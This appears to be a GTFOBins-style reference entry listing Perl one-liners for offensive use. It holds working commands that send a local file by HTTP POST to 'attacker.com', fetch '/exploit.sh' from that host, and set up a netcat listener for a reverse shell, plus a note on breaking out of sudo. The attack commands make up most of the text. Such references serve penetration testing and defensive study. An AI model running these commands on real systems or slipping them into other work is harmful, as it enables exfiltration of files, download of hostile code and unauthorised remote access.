file-upload.description: Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
file-upload.code:
export RHOST=attacker.com
export RPORT=8080
export LFILE=file_to_send
perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>$ENV{"RHOST"}, PeerPort=>$ENV{"RPORT"}, Proto=>"tcp") or die;open(my $file, "<", $ENV{"LFILE"}) or die;$content = join("", <$file>);close($file);$post_data = "d=" . $content;$headers = "POST / HTTP/1.1
Host: " . $ENV{"RHOST"} . "
Content-Type: application/x-www-form-urlencoded
Content-Length: " . length($post_data) . "
Connection: close

";print $s $headers . $post_data;while (<$s>) { }close($s);'

file-download.description: Download a file via HTTP. For example, run `python3 -m http.server 8080` on the serving side.
file-download.code:
export RHOST=attacker.com
export RPORT=8080
export URL=/exploit.sh
export LFILE=output.txt
perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>$ENV{"RHOST"},PeerPort=>$ENV{"RPORT"},Proto=>"tcp") or die; print $s "GET " . $ENV{"URL"} . " HTTP/1.1
Host: " . $ENV{"RHOST"} . "
Metadata: true
Connection: close

"; open(my $fh, ">", $ENV{"LFILE"}) or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq "
") { $in_content = 1; } } close($s); close($fh);'

reverse-shell.description: Run `nc -l -p 12345` on the attacker box to receive the shell.

sudo.description: Don't forget to `CTRL+D` to exit the perl shell and get the shell.
